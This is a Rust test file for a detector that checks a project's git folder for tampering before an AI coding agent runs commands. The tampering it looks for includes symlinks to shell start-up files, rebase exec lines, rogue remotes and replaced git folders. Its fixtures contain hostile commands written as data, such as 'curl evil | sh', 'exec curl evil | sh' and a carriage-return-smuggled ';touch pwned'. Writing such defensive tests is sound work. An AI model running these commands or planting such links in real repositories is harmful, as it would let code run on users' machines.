#![allow(clippy::expect_used)]

use super::unix::Finding;
use super::unix::check;
use super::unix::exec_lines;
use super::unix::held_for;
use super::unix::report;
use super::*;
use codex_protocol::ThreadId;
use pretty_assertions::assert_eq;
use std::os::unix::fs::PermissionsExt;
use std::os::unix::fs::symlink;
use std::path::Path;
use std::path::PathBuf;
use std::time::Duration;
use std::time::SystemTime;
use tempfile::TempDir;

/// A project with a minimal git folder, and a place outside it.
struct Project {
    _dir: TempDir,
    base: PathBuf,
    root: PathBuf,
    outside: PathBuf,
}

impl Project {
    fn new() -> Self {
        let dir = TempDir::new().expect("temp dir");
        let base = dir.path().canonicalize().expect("canonical");
        let root = base.join("project");
        let git = root.join(".git");
        for folder in ["objects/ab", "refs/heads", "logs/refs/heads", "hooks"] {
            std::fs::create_dir_all(git.join(folder)).expect("git folder");
        }
        std::fs::write(git.join("HEAD"), "ref: refs/heads/main\n").expect("HEAD");
        std::fs::write(git.join("config"), "[core]\n").expect("config");
        std::fs::write(git.join("logs/HEAD"), "").expect("log");
        std::fs::write(git.join("refs/heads/main"), "0\n").expect("ref");
        let outside = base.join("outside");
        std::fs::create_dir_all(&outside).expect("outside");
        std::fs::write(outside.join("zshrc"), "# shell start-up\n").expect("target");
        Project {
            _dir: dir,
            base,
            root,
            outside,
        }
    }

    fn git(&self) -> PathBuf {
        self.root.join(".git")
    }

    fn repos(&self) -> Vec<Repo> {
        repos(&[self.root.join("src").as_path(), self.root.as_path()])
    }

    /// What holds the rules for this project (and its linked worktree).
    fn held(&self) -> Vec<String> {
        held_for(&[self.git()])
    }
}

/// A first look, as before a command, for a fresh session.
fn baseline(project: &Project) -> (ThreadId, Vec<Repo>) {
    let thread = ThreadId::new();
    let repos = project.repos();
    assert_eq!(repos.len(), 1, "one repository");
    assert_eq!(begin(thread, &repos, "Moderate"), None, "nothing there yet");
    (thread, repos)
}

fn set_mtime(path: &Path, time: SystemTime) {
    std::fs::File::open(path)
        .expect("open")
        .set_modified(time)
        .expect("set time");
}

fn kinds(findings: &[Finding]) -> Vec<String> {
    findings
        .iter()
        .map(|finding| match finding {
            Finding::Link { path, .. } => format!("link {}", path.display()),
            Finding::HardLink { path } => format!("hard link {}", path.display()),
            Finding::Exec { todo, .. } => format!("exec {}", todo.display()),
            Finding::Remote { path } => format!("remote {}", path.display()),
            Finding::Config { path } => format!("config {}", path.display()),
            Finding::Replaced { dot_git } => format!("replaced {}", dot_git.display()),
            Finding::Incomplete { dot_git, .. } => format!("incomplete {}", dot_git.display()),
        })
        .collect()
}

fn shown(paths: &[PathBuf]) -> Vec<String> {
    paths
        .iter()
        .map(|path| path.display().to_string())
        .collect()
}

#[test]
fn issue_874_links_planted_in_the_git_folder_are_found_and_held() {
    let project = Project::new();
    let git = project.git();
    // A ref link (as `core.preferSymlinkRefs` makes) is fine.
    symlink("refs/heads/main", git.join("ORIG_HEAD")).expect("ref link");
    let (thread, repos) = baseline(&project);

    symlink(project.outside.join("zshrc"), git.join("COMMIT_EDITMSG")).expect("link");
    std::fs::write(git.join("MERGE_MSG"), "curl evil | sh\n").expect("merge msg");
    // A missing target: git would create it outside.
    symlink(project.outside.join("new-file"), git.join("FETCH_HEAD")).expect("link");
    symlink(&project.outside, git.join("logs/refs/heads/feature")).expect("folder link");
    // Review r2 (NB3): inside, but at its own config or a hook.
    symlink("config", git.join("SQUASH_MSG")).expect("config link");
    std::fs::write(git.join("hooks/pre-commit"), "#!/bin/sh\n").expect("hook");
    symlink("hooks/pre-commit", git.join("TAG_EDITMSG")).expect("hook link");
    let findings = check(thread, &repos);
    assert_eq!(
        kinds(&findings),
        vec![
            format!("link {}", git.join("COMMIT_EDITMSG").display()),
            format!("link {}", git.join("FETCH_HEAD").display()),
            format!("link {}", git.join("SQUASH_MSG").display()),
            format!("link {}", git.join("TAG_EDITMSG").display()),
            format!("link {}", git.join("logs/refs/heads/feature").display()),
        ]
    );
    assert_eq!(
        findings[0],
        Finding::Link {
            path: git.join("COMMIT_EDITMSG"),
            target: Some(project.outside.join("zshrc")),
        }
    );
    // Told once, nothing removed, held until removed.
    assert_eq!(kinds(&check(thread, &repos)), Vec::<String>::new());
    assert!(git.join("COMMIT_EDITMSG").symlink_metadata().is_ok());
    assert_eq!(project.held().len(), 5);
    for name in [
        "COMMIT_EDITMSG",
        "FETCH_HEAD",
        "SQUASH_MSG",
        "TAG_EDITMSG",
        "hooks/pre-commit",
    ] {
        std::fs::remove_file(git.join(name)).expect("remove");
    }
    assert_eq!(
        project.held(),
        shown(&[git.join("logs/refs/heads/feature")])
    );
    std::fs::remove_file(git.join("logs/refs/heads/feature")).expect("remove");
    assert_eq!(project.held(), Vec::<String>::new());
    // A link retargeted through a link inside: found then.
    symlink("ORIG_HEAD", git.join("info-link")).expect("link to a link");
    assert_eq!(kinds(&check(thread, &repos)), Vec::<String>::new());
    std::fs::remove_file(git.join("ORIG_HEAD")).expect("remove");
    symlink(project.outside.join("zshrc"), git.join("ORIG_HEAD")).expect("retarget");
    assert_eq!(
        kinds(&check(thread, &repos)),
        vec![
            format!("link {}", git.join("ORIG_HEAD").display()),
            format!("link {}", git.join("info-link").display()),
        ]
    );
}

/// Review r2 (SF1): a session's first look (also after the repository was
/// forgotten) reports links and steps that are already there.
#[test]
fn issue_874_a_first_look_reports_what_is_there() {
    let project = Project::new();
    let git = project.git();
    symlink(project.outside.join("zshrc"), git.join("COMMIT_EDITMSG")).expect("link");
    std::fs::create_dir_all(git.join("rebase-merge")).expect("rebase");
    std::fs::write(git.join("rebase-merge/git-rebase-todo"), "x touch pwned\n").expect("todo");
    // Not reported at a first look: an ordinary repository may have these.
    std::fs::create_dir_all(git.join("remotes")).expect("remotes");
    std::fs::write(git.join("remotes/origin"), "URL: x\n").expect("remote");
    let repos = project.repos();
    let message = begin(ThreadId::new(), &repos, "Moderate").expect("reported");
    assert!(message.contains("COMMIT_EDITMSG"), "{message}");
    assert!(message.contains("x touch pwned"), "{message}");
    assert!(!message.contains("remotes"), "{message}");
    assert_eq!(project.held().len(), 2);
}

/// Review r1 (B4): a chain through `refs` that ends at a missing file
/// outside; (S9) a folder link in `refs`; only the objects' fan-out folders
/// go unvisited.
#[test]
fn issue_874_chains_refs_and_objects() {
    let project = Project::new();
    let git = project.git();
    let (thread, repos) = baseline(&project);
    symlink(project.outside.join(".zlogin"), git.join("refs/x")).expect("ref link");
    symlink("refs/x", git.join("COMMIT_EDITMSG")).expect("chain");
    symlink(&project.outside, git.join("refs/tags")).expect("folder link");
    symlink(project.outside.join("zshrc"), git.join("objects/evil")).expect("object link");
    // Git reads objects below the fan-out folders; not looked at.
    symlink(project.outside.join("zshrc"), git.join("objects/ab/cdef")).expect("object");
    assert_eq!(
        kinds(&check(thread, &repos)),
        vec![
            format!("link {}", git.join("COMMIT_EDITMSG").display()),
            format!("link {}", git.join("objects/evil").display()),
            format!("link {}", git.join("refs/tags").display()),
            format!("link {}", git.join("refs/x").display()),
        ]
    );
}

/// Review r1 (B1): setting a folder's or todo's modification time back
/// doesn't hide a change (the status-change time moves anyway).
#[test]
fn issue_874_restored_modification_times_hide_nothing() {
    let project = Project::new();
    let git = project.git();
    std::fs::create_dir_all(git.join("rebase-merge")).expect("rebase");
    std::fs::write(git.join("rebase-merge/git-rebase-todo"), "pick 1234 abcd\n").expect("todo");
    let (thread, repos) = baseline(&project);
    // Past the window in which a just-changed folder is listed again.
    std::thread::sleep(Duration::from_millis(/*millis*/ 2_200));
    assert_eq!(kinds(&check(thread, &repos)), Vec::<String>::new());
    let folder_time = git.metadata().expect("meta").modified().expect("time");
    let todo = git.join("rebase-merge/git-rebase-todo");
    let todo_time = todo.metadata().expect("meta").modified().expect("time");
    symlink(project.outside.join("zshrc"), git.join("COMMIT_EDITMSG")).expect("link");
    set_mtime(&git, folder_time);
    // Same size, in place.
    std::fs::OpenOptions::new()
        .write(true)
        .open(&todo)
        .and_then(|mut file| std::io::Write::write_all(&mut file, b"x touch pwnd12\n"))
        .expect("rewrite");
    set_mtime(&todo, todo_time);
    assert_eq!(
        kinds(&check(thread, &repos)),
        vec![
            format!("link {}", git.join("COMMIT_EDITMSG").display()),
            format!("exec {}", todo.display()),
        ]
    );
}

/// Review r1 (B2): a folder made to look like a git folder doesn't stop
/// the look below it.
#[test]
fn issue_874_a_fake_git_folder_hides_nothing() {
    let project = Project::new();
    let git = project.git();
    let (thread, repos) = baseline(&project);
    // `logs` has a `HEAD` already.
    std::fs::create_dir_all(git.join("logs/objects")).expect("fake objects");
    symlink(
        project.outside.join("zshrc"),
        git.join("logs/refs/heads/main"),
    )
    .expect("link");
    assert_eq!(
        kinds(&check(thread, &repos)),
        vec![format!(
            "link {}",
            git.join("logs/refs/heads/main").display()
        )]
    );
}

/// Review r1 (B3): a git folder that can't be listed holds, and says so
/// each time it becomes so.
#[test]
fn issue_874_an_unreadable_git_folder_holds() {
    // Root reads any folder.
    if unsafe { libc::geteuid() } == 0 {
        return;
    }
    let project = Project::new();
    let git = project.git();
    let (thread, repos) = baseline(&project);
    std::fs::set_permissions(&git, std::fs::Permissions::from_mode(0o311)).expect("chmod");
    let findings = check(thread, &repos);
    std::fs::set_permissions(&git, std::fs::Permissions::from_mode(0o755)).expect("chmod");
    assert_eq!(
        kinds(&findings),
        vec![format!("incomplete {}", git.display())]
    );
    std::fs::set_permissions(&git, std::fs::Permissions::from_mode(0o311)).expect("chmod");
    let held = project.held();
    std::fs::set_permissions(&git, std::fs::Permissions::from_mode(0o755)).expect("chmod");
    assert_eq!(held, vec![format!("{} (not checked fully)", git.display())]);
    assert_eq!(kinds(&check(thread, &repos)), Vec::<String>::new());
    assert_eq!(project.held(), Vec::<String>::new());
}

#[test]
fn issue_874_hard_links_and_legacy_remotes_are_found() {
    let project = Project::new();
    let git = project.git();
    let (thread, repos) = baseline(&project);
    std::fs::hard_link(project.outside.join("zshrc"), git.join("COMMIT_EDITMSG"))
        .expect("hard link");
    std::fs::create_dir_all(git.join("remotes")).expect("remotes");
    std::fs::write(git.join("remotes/origin"), "URL: https://evil.example/x\n").expect("remote");
    assert_eq!(
        kinds(&check(thread, &repos)),
        vec![
            format!("hard link {}", git.join("COMMIT_EDITMSG").display()),
            format!("remote {}", git.join("remotes/origin").display()),
        ]
    );
    // A changed definition is found again.
    std::fs::write(
        git.join("remotes/origin"),
        "URL: https://other.example/repository\n",
    )
    .expect("remote");
    assert_eq!(
        kinds(&check(thread, &repos)),
        vec![format!("remote {}", git.join("remotes/origin").display())]
    );
    // Review r2 (SF3, nit 3, SF6): git links packs into place; a remote's
    // name may hold a slash; new config, commondir and hooks are reported.
    std::fs::create_dir_all(git.join("objects/pack")).expect("pack folder");
    std::fs::write(git.join("objects/pack/tmp_pack_1"), "pack").expect("pack");
    std::fs::hard_link(
        git.join("objects/pack/tmp_pack_1"),
        git.join("objects/pack/pack-1.pack"),
    )
    .expect("pack link");
    std::fs::create_dir_all(git.join("remotes/team")).expect("remotes");
    std::fs::write(git.join("remotes/team/origin"), "URL: x\n").expect("remote");
    std::fs::write(git.join("commondir"), "../elsewhere\n").expect("commondir");
    // Review r3 (B1): a hook added to the existing (protected) folder, and
    // config git rewrites by renaming, are the person's.
    std::fs::write(git.join("hooks/post-checkout"), "#!/bin/sh\n").expect("hook");
    std::fs::write(git.join("config.lock"), "[core]\n\tbare = false\n").expect("lock");
    std::fs::rename(git.join("config.lock"), git.join("config")).expect("rename");
    assert_eq!(
        kinds(&check(thread, &repos)),
        vec![
            format!("config {}", git.join("commondir").display()),
            format!("remote {}", git.join("remotes/team/origin").display()),
        ]
    );
    for name in ["commondir", "hooks/post-checkout", "remotes/team/origin"] {
        std::fs::remove_file(git.join(name)).expect("remove");
    }
    // Review r1 (S3): held by what it is, not by its inode.
    std::fs::remove_file(git.join("COMMIT_EDITMSG")).expect("remove");
    std::fs::write(git.join("COMMIT_EDITMSG"), "message\n").expect("regular file");
    std::fs::remove_file(git.join("remotes/origin")).expect("remove");
    assert_eq!(project.held(), Vec::<String>::new());
}

#[test]
fn issue_874_rebase_and_sequencer_exec_lines_are_found() {
    let project = Project::new();
    let git = project.git();
    let (thread, repos) = baseline(&project);
    std::fs::create_dir_all(git.join("rebase-merge")).expect("rebase");
    std::fs::write(
        git.join("rebase-merge/git-rebase-todo"),
        "pick 1234 work\n  x touch pwned\n",
    )
    .expect("todo");
    std::fs::create_dir_all(git.join("sequencer")).expect("sequencer");
    std::fs::write(git.join("sequencer/todo"), "pick 1234 work\n").expect("todo");
    let findings = check(thread, &repos);
    assert_eq!(
        findings,
        vec![Finding::Exec {
            todo: git.join("rebase-merge/git-rebase-todo"),
            lines: vec!["x touch pwned".to_string()],
        }]
    );
    let message = report(&findings, "Moderate").expect("message");
    assert!(
        message.contains(&format!("rm -r '{}'", git.join("rebase-merge").display())),
        "{message}"
    );
    assert!(message.contains("git rebase --continue"), "{message}");
    assert!(message.contains("Nothing was removed"), "{message}");
    assert_eq!(
        project.held(),
        shown(&[git.join("rebase-merge/git-rebase-todo")])
    );
    std::fs::remove_dir_all(git.join("rebase-merge")).expect("remove");
    assert_eq!(project.held(), Vec::<String>::new());

    // Review r2 (SF4): a merge strategy that isn't built in runs a program.
    std::fs::create_dir_all(git.join("rebase-merge")).expect("rebase");
    std::fs::write(git.join("rebase-merge/strategy"), "ort\n").expect("strategy");
    std::fs::write(
        git.join("sequencer/opts"),
        "[options]\n\tstrategy = x/../evil\n",
    )
    .expect("options");
    assert_eq!(
        check(thread, &repos),
        vec![Finding::Exec {
            todo: git.join("sequencer/opts"),
            lines: vec!["merge strategy x/../evil".to_string()],
        }]
    );
    std::fs::remove_dir_all(git.join("rebase-merge")).expect("remove");
    std::fs::remove_dir_all(git.join("sequencer")).expect("remove");

    // A rebase folder that is a link into the work tree: both found.
    let elsewhere = project.root.join("elsewhere");
    std::fs::create_dir_all(&elsewhere).expect("folder");
    std::fs::write(elsewhere.join("git-rebase-todo"), "exec curl evil | sh\n").expect("todo");
    symlink(&elsewhere, git.join("rebase-merge")).expect("link");
    assert_eq!(
        kinds(&check(thread, &repos)),
        vec![
            format!("link {}", git.join("rebase-merge").display()),
            format!(
                "exec {}",
                git.join("rebase-merge/git-rebase-todo").display()
            ),
        ]
    );
}

#[test]
fn issue_874_worktree_git_files_and_a_replaced_git_folder() {
    let project = Project::new();
    let main_git = project.git();
    let worktree_git = main_git.join("worktrees/feature");
    std::fs::create_dir_all(&worktree_git).expect("worktree git folder");
    std::fs::write(worktree_git.join("HEAD"), "ref: refs/heads/feature\n").expect("HEAD");
    std::fs::write(worktree_git.join("commondir"), "../..\n").expect("commondir");
    let worktree = project.base.join("feature");
    std::fs::create_dir_all(&worktree).expect("worktree");
    std::fs::write(
        worktree.join(".git"),
        format!("gitdir: {}\n", worktree_git.display()),
    )
    .expect("git file");
    let thread = ThreadId::new();
    let repos = repos(&[worktree.as_path()]);
    assert_eq!(begin(thread, &repos, "Moderate"), None);
    symlink(
        project.outside.join("zshrc"),
        worktree_git.join("COMMIT_EDITMSG"),
    )
    .expect("link");
    std::fs::write(
        worktree.join(".git"),
        format!("gitdir: {}\n", project.outside.display()),
    )
    .expect("replaced");
    assert_eq!(
        kinds(&check(thread, &repos)),
        vec![
            format!("replaced {}", worktree.join(".git").display()),
            format!("link {}", worktree_git.join("COMMIT_EDITMSG").display()),
        ]
    );
    // Held while it stays replaced.
    assert!(
        project
            .held()
            .contains(&worktree.join(".git").display().to_string())
    );
}

#[test]
fn issue_874_exec_lines_are_read_as_git_reads_them() {
    assert_eq!(
        exec_lines(
            "pick 1\n\texec make test\n# exec no\nx  ls\nexecute no\nx\nexec\nx\r;touch pwned\nedit 2\n"
        ),
        vec![
            "exec make test".to_string(),
            "x  ls".to_string(),
            "x\r;touch pwned".to_string(),
        ]
    );
}

#[test]
fn issue_874_the_message_quotes_paths_and_hides_disguising_characters() {
    let message = report(
        &[
            Finding::Link {
                path: PathBuf::from("/p/it's/.git/COMMIT_EDITMSG"),
                target: Some(PathBuf::from("/home/me/.zshrc\u{1b}[2J")),
            },
            Finding::Link {
                path: PathBuf::from("/p/.git/logs/HEAD\u{202e}txt"),
                target: None,
            },
        ],
        "Moderate",
    )
    .expect("message");
    assert!(
        message.contains(r"rm '/p/it'\''s/.git/COMMIT_EDITMSG'"),
        "{message}"
    );
    assert!(!message.contains('\u{1b}'), "{message}");
    assert!(!message.contains('\u{202e}'), "{message}");
    assert!(message.contains("remove it by hand"), "{message}");
}

/// Review r1 (S1): something planted after a command's look (typed into a
/// running shell, or by a process left running) is found, and holds,
/// before the next command is decided, also from another session working
/// in the same project.
#[test]
fn issue_874_the_next_command_looks_again_first() {
    let project = Project::new();
    let git = project.git();
    let (thread, _) = baseline(&project);
    symlink(project.outside.join("zshrc"), git.join("COMMIT_EDITMSG")).expect("link");
    let (message, held) = recheck(thread, "Moderate", &[project.root.as_path()]);
    assert!(!held.is_empty());
    assert!(
        message.is_some_and(|message| message.contains("COMMIT_EDITMSG")),
        "reported"
    );
    // Another session, in the same project: held too.
    let (message, held) = recheck(ThreadId::new(), "Moderate", &[project.root.as_path()]);
    assert_eq!(
        (message, held),
        (None, vec![git.join("COMMIT_EDITMSG").display().to_string()])
    );
    // Elsewhere: not.
    let other = Project::new();
    let (_, held) = recheck(ThreadId::new(), "Moderate", &[other.root.as_path()]);
    assert_eq!(held, Vec::<String>::new());
}

/// Review r3 (S1, B1): a hooks folder made where there was none, hidden
/// behind an unreadable look, is reported once it can be read.
#[test]
fn issue_874_a_new_hooks_folder_behind_an_unreadable_look_is_reported() {
    if unsafe { libc::geteuid() } == 0 {
        return;
    }
    let project = Project::new();
    let git = project.git();
    std::fs::remove_dir_all(git.join("hooks")).expect("no hooks");
    let (thread, repos) = baseline(&project);
    std::fs::create_dir_all(git.join("hooks")).expect("hooks");
    std::fs::write(git.join("hooks/pre-commit"), "#!/bin/sh\n").expect("hook");
    std::fs::set_permissions(git.join("hooks"), std::fs::Permissions::from_mode(0o000))
        .expect("chmod");
    let first = check(thread, &repos);
    std::fs::set_permissions(git.join("hooks"), std::fs::Permissions::from_mode(0o755))
        .expect("chmod");
    assert_eq!(
        kinds(&first),
        vec![
            format!("config {}", git.join("hooks").display()),
            format!("incomplete {}", git.display()),
        ]
    );
    assert_eq!(kinds(&check(thread, &repos)), Vec::<String>::new());
    assert_eq!(project.held(), shown(&[git.join("hooks")]));
}

/// Review r3 (S2, S4): a removed worktree or clone isn't "replaced" and
/// holds nothing; links in a hooks folder (the person's hook setup) aren't
/// reported, not even at a first look.
#[test]
fn issue_874_removed_repositories_and_hook_links_hold_nothing() {
    let project = Project::new();
    let git = project.git();
    std::fs::write(project.root.join("pre-commit.sh"), "#!/bin/sh\n").expect("script");
    symlink("../../pre-commit.sh", git.join("hooks/pre-commit")).expect("hook link");
    let (thread, repos) = baseline(&project);
    std::fs::rename(&git, project.base.join("moved-git")).expect("remove .git");
    assert_eq!(kinds(&check(thread, &repos)), Vec::<String>::new());
    assert_eq!(project.held(), Vec::<String>::new());
    std::fs::rename(project.base.join("moved-git"), &git).expect("restore .git");
    assert_eq!(kinds(&check(thread, &repos)), Vec::<String>::new());
}

/// Review r3 (S3): git reads `[options] strategy` in any case and on the
/// section's own line.
#[test]
fn issue_874_strategy_spellings() {
    let project = Project::new();
    let git = project.git();
    let (thread, repos) = baseline(&project);
    std::fs::create_dir_all(git.join("sequencer")).expect("sequencer");
    for opts in [
        "[OPTIONS]\n\tSTRATEGY = x/../evil\n",
        "[options] strategy = \"y/../evil\"\n",
    ] {
        std::fs::write(git.join("sequencer/opts"), opts).expect("options");
        let findings = check(thread, &repos);
        assert!(
            matches!(&findings[..], [Finding::Exec { lines, .. }] if lines[0].contains("/../evil")),
            "{opts:?}: {findings:?}"
        );
    }
}

#[test]
fn issue_874_long_reports_are_cut() {
    let findings: Vec<Finding> = (0..25)
        .map(|n| Finding::Remote {
            path: PathBuf::from(format!("/p/.git/remotes/r{n}")),
        })
        .collect();
    let message = report(&findings, "Moderate").expect("message");
    assert!(message.contains("and 5 more"), "{message}");
    assert!(!message.contains("remotes/r24"), "{message}");
}

/// Review r4 (S1'): a remote hidden behind an unreadable git folder is
/// reported once the folder can be read again.
#[test]
fn issue_874_a_remote_behind_an_unreadable_git_folder_is_reported() {
    if unsafe { libc::geteuid() } == 0 {
        return;
    }
    let project = Project::new();
    let git = project.git();
    let (thread, repos) = baseline(&project);
    std::fs::create_dir_all(git.join("remotes")).expect("remotes");
    std::fs::write(
        git.join("remotes/upstream"),
        "URL: https://evil.example/x\n",
    )
    .expect("remote");
    std::fs::set_permissions(&git, std::fs::Permissions::from_mode(0o000)).expect("chmod");
    let hidden = check(thread, &repos);
    std::fs::set_permissions(&git, std::fs::Permissions::from_mode(0o755)).expect("chmod");
    assert_eq!(
        kinds(&hidden),
        vec![format!("incomplete {}", git.display())]
    );
    assert_eq!(
        kinds(&check(thread, &repos)),
        vec![format!("remote {}", git.join("remotes/upstream").display())]
    );
}

/// Review r4 (nit 3): a repository deleted and cloned again in the same
/// place gets a first look, not "replaced".
#[test]
fn issue_874_a_recloned_repository_gets_a_first_look() {
    let project = Project::new();
    let git = project.git();
    let (thread, repos) = baseline(&project);
    std::fs::remove_dir_all(&git).expect("delete");
    assert_eq!(kinds(&check(thread, &repos)), Vec::<String>::new());
    std::fs::create_dir_all(git.join("objects")).expect("clone");
    std::fs::create_dir_all(git.join("refs/heads")).expect("clone");
    std::fs::write(git.join("HEAD"), "ref: refs/heads/main\n").expect("HEAD");
    assert_eq!(kinds(&check(thread, &repos)), Vec::<String>::new());
    assert_eq!(project.held(), Vec::<String>::new());
}

/// Review r4 (nit 5): a rebase with `-x` is reported when a command line
/// appears, not at each step.
#[test]
fn issue_874_a_rebase_is_reported_when_a_command_appears() {
    let project = Project::new();
    let git = project.git();
    let (thread, repos) = baseline(&project);
    let todo = git.join("rebase-merge/git-rebase-todo");
    std::fs::create_dir_all(git.join("rebase-merge")).expect("rebase");
    std::fs::write(&todo, "pick 1\nexec make\npick 2\nexec make test\n").expect("todo");
    assert_eq!(check(thread, &repos).len(), 1);
    std::fs::write(&todo, "pick 2\nexec make test\n").expect("step");
    assert_eq!(kinds(&check(thread, &repos)), Vec::<String>::new());
    std::fs::write(&todo, "pick 2\nexec make test\nexec curl evil | sh\n").expect("added");
    assert_eq!(
        kinds(&check(thread, &repos)),
        vec![format!("exec {}", todo.display())]
    );
}

/// CI (#926): the Linux sandbox leaves empty config files and an empty
/// hooks folder in place as mount points while a command runs, where
/// another session's look sees them. Git runs nothing from them; they are
/// reported once something is put in them.
#[test]
fn issue_874_empty_config_and_hooks_are_reported_once_filled() {
    let project = Project::new();
    let git = project.git();
    std::fs::remove_dir_all(git.join("hooks")).expect("no hooks");
    let (thread, repos) = baseline(&project);
    std::fs::create_dir(git.join("hooks")).expect("empty hooks");
    std::fs::write(git.join("config.worktree"), "").expect("empty config");
    std::fs::write(git.join("commondir"), "").expect("empty commondir");
    assert_eq!(kinds(&check(thread, &repos)), Vec::<String>::new());
    assert_eq!(project.held(), Vec::<String>::new());
    // Still empty: still nothing.
    assert_eq!(kinds(&check(thread, &repos)), Vec::<String>::new());
    // Filled in place, nothing else changed (the git folder itself doesn't).
    fill(&git.join("config.worktree"));
    assert_eq!(
        kinds(&check(thread, &repos)),
        vec![format!("config {}", git.join("config.worktree").display())]
    );
    // A hook put in the folder, and a file renamed over the other one.
    std::fs::write(git.join("hooks/pre-commit"), "#!/bin/sh\n").expect("hook");
    std::fs::write(git.join("commondir.new"), "../elsewhere\n").expect("commondir");
    std::fs::rename(git.join("commondir.new"), git.join("commondir")).expect("rename");
    assert_eq!(
        kinds(&check(thread, &repos)),
        vec![
            format!("config {}", git.join("commondir").display()),
            format!("config {}", git.join("hooks").display()),
        ]
    );
    let mut held = project.held();
    held.sort();
    assert_eq!(
        held,
        shown(&[
            git.join("commondir"),
            git.join("config.worktree"),
            git.join("hooks")
        ])
    );
}

/// Review r6 (B1): an empty one is remembered for every session, also after
/// a session forgets the repository: filled later, it is reported at a
/// first look too.
#[test]
fn issue_874_an_empty_config_is_remembered_across_sessions_and_forgetting() {
    let project = Project::new();
    let git = project.git();
    let (thread, repos) = baseline(&project);
    std::fs::write(git.join("config.worktree"), "").expect("empty config");
    std::fs::write(git.join("commondir"), "").expect("empty commondir");
    assert_eq!(kinds(&check(thread, &repos)), Vec::<String>::new());
    // Another session (a parent after its sub-agent) looks first, then a
    // command there fills it.
    let other = ThreadId::new();
    assert_eq!(begin(other, &repos, "Moderate"), None);
    fill(&git.join("config.worktree"));
    assert_eq!(
        kinds(&check(other, &repos)),
        vec![format!("config {}", git.join("config.worktree").display())]
    );
    // The first session works in more repositories than it keeps, forgets
    // this one, and a command fills the other file.
    let scratch: Vec<Project> = (0..17).map(|_| Project::new()).collect();
    for project in &scratch {
        check(thread, &project.repos());
    }
    fill(&git.join("commondir"));
    assert_eq!(
        kinds(&check(thread, &repos)),
        vec![format!("config {}", git.join("commondir").display())]
    );
    let mut held = project.held();
    held.sort();
    assert_eq!(
        held,
        shown(&[git.join("commondir"), git.join("config.worktree")])
    );
}

/// Appends to `path` in place (its inode unchanged).
fn fill(path: &Path) {
    std::fs::OpenOptions::new()
        .append(true)
        .open(path)
        .and_then(|mut file| std::io::Write::write_all(&mut file, b"x\n"))
        .expect("filled");
}

/// CI (#926): an empty `.git` folder replaced by another (the Linux
/// sandbox's mount point, removed and made again by other commands, with
/// empty mount points of its own in it) isn't reported; what is put in it
/// later is.
#[test]
fn issue_874_an_empty_git_folder_replaced_by_another() {
    let project = Project::new();
    let git = project.git();
    std::fs::rename(&git, project.base.join("saved-git")).expect("moved");
    std::fs::create_dir(&git).expect("empty .git");
    let (thread, repos) = baseline(&project);
    std::fs::remove_dir(&git).expect("removed");
    std::fs::create_dir(&git).expect("empty .git again");
    std::fs::write(git.join("config"), "").expect("empty config");
    std::fs::create_dir(git.join("hooks")).expect("empty hooks");
    assert_eq!(kinds(&check(thread, &repos)), Vec::<String>::new());
    assert_eq!(project.held(), Vec::<String>::new());
    std::fs::write(git.join("config.worktree"), "[core]\n").expect("config");
    assert_eq!(
        kinds(&check(thread, &repos)),
        vec![format!("config {}", git.join("config.worktree").display())]
    );
}

/// Review r7 (B1): a full `.git` replaced by an empty folder is reported
/// and held (filled later, a submodule's config there wouldn't be).
#[test]
fn issue_874_a_full_git_folder_replaced_by_an_empty_one() {
    let project = Project::new();
    let git = project.git();
    let (thread, repos) = baseline(&project);
    std::fs::rename(&git, project.base.join("saved-git")).expect("moved");
    std::fs::create_dir(&git).expect("empty .git");
    assert_eq!(
        kinds(&check(thread, &repos)),
        vec![format!("replaced {}", git.display())]
    );
    assert!(project.held().contains(&git.display().to_string()));
}

/// Review r7 (B2): another session forgetting an empty one that went (its
/// look saw it gone) doesn't make this session miss what is put there
/// next.
#[test]
fn issue_874_an_empty_config_forgotten_by_another_session() {
    let project = Project::new();
    let git = project.git();
    let (thread, repos) = baseline(&project);
    std::fs::write(git.join("config.worktree"), "").expect("empty config");
    assert_eq!(kinds(&check(thread, &repos)), Vec::<String>::new());
    let other = ThreadId::new();
    assert_eq!(begin(other, &repos, "Moderate"), None);
    std::fs::remove_file(git.join("config.worktree")).expect("removed");
    assert_eq!(kinds(&check(other, &repos)), Vec::<String>::new());
    std::fs::write(git.join("config.worktree"), "[core]\n").expect("config");
    assert_eq!(
        kinds(&check(thread, &repos)),
        vec![format!("config {}", git.join("config.worktree").display())]
    );
}

/// #943 item 11 (review r1): the folder a command runs in is never left out
/// by the cap on repositories looked at, nor when what holds it is worked
/// out.
#[test]
fn issue_943_the_command_folder_is_not_left_out_by_the_cap() {
    let projects: Vec<Project> = (0..=unix::MAX_REPOS).map(|_| Project::new()).collect();
    let (last, others) = projects.split_last().expect("projects");
    let folders: Vec<&Path> = others
        .iter()
        .map(|project| project.root.as_path())
        .collect();
    assert_eq!(repos(&folders).len(), unix::MAX_REPOS);
    let found = repos_and(&folders, Some(last.root.as_path()));
    assert_eq!(found.len(), unix::MAX_REPOS + 1);
    // Its finding holds a command there, past the cap too.
    let (thread, _) = baseline(last);
    symlink(
        last.outside.join("zshrc"),
        last.git().join("COMMIT_EDITMSG"),
    )
    .expect("link");
    let mut all = folders.clone();
    all.push(last.root.as_path());
    let (_, held) = recheck(thread, "Moderate", &all);
    assert_eq!(
        held,
        vec![last.git().join("COMMIT_EDITMSG").display().to_string()]
    );
}
